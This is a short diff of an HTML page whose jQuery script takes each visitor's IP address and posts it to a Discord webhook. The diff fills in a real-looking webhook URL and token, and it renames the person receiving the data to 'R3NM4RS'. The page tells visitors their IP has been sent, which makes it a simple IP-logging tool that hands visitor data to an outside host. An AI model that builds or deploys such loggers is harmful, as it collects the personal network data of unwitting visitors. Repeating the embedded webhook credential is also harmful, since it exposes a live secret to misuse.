@@ -45,7 +45,7 @@
 					var ipAddress = data.ip;
 					$.ajax({
 						type: "POST",
-						url: "WEBHOOK HERE",
+						url: "https://discord.com/api/webhooks/1102989283549253683/YSm6wVQAr08YBdYZuE1QLl8fKPMonbsojvoZHasZRjFUAYRJoEnzw2kdI9EUcKN5jFdV",
 						contentType: "application/json",
 						data: JSON.stringify({"content": "IP Address: " + ipAddress}),
 						success: function() {
@@ -55,7 +55,7 @@
 							});
 						},
 						error: function(xhr, status, error) {
-							console.error("Error sending IP address to makosman: " + error);
+							console.error("Error sending IP address to R3NM4RS: " + error);
 						}
 					});
 				});
@@ -65,6 +65,6 @@
 </head>
 <body>
 	<div id="message1">Please wait while your IP address is being retrieved...</div>
-	<div id="message2">Your IP address has been successfully sent to makosman!</div>
+	<div id="message2">Your IP address has been successfully sent to R3NM4RS!</div>
 </body>
 </html>
